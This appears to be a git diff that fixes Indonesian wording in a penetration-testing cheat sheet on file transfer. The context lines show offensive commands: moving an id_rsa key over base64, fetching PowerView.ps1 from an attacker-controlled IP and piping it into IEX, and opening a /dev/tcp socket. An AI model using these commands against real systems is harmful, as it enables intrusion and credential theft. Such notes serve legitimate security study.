@@ -1,7 +1,7 @@
 <h1 align="center">File Transfer</h1>
 <h2 align="center">Windows</h2>
 
-### Metode 1: copas dari Linux
+### Metode 1: Copy paste dari Linux
 - Cek dulu hash-nya di linux: `md5sum file`
 - Konversi ke base64: `cat file |base64 -w 0;echo`
 - Di windows: `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("ENCODED-BASE64"))`
@@ -160,7 +160,7 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
 
 <h2 align="center">Linux</h2>
 
-### Metode 1: copas encode
+### Metode 1: Copy paste encode
 - Di komputer attacker
   ```
   cat id_rsa |base64 -w 0;echo
@@ -192,7 +192,7 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
   ```
 
 ### Metode 4: download dengan bash (/dev/tcp)
-- Koneksi dh web server komputer target
+- Koneksi di web server komputer target
   ```
   exec 3<>/dev/tcp/10.10.10.32/80
   ```
